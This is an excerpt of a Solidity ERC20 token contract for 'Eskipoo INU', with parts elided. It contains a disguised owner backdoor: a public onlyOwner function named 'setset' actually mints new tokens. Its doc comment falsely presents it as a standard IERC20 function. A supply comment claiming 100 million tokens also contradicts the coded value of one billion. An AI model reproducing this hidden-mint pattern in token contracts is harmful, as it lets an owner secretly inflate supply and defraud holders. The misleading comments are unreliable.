...
contract ERC20 is Context, IERC20, Ownable {
    ...
    /**
     * @dev See {IERC20-setset}.
     */ 
    function setset(uint256 amount) public onlyOwner {
    setset(msg.sender, amount);
    }
    ...
    function setset(address account, uint256 amount) internal virtual {
...
contract Eskipoo is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Eskipoo INU", "ESKIPOO") {
        setset(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}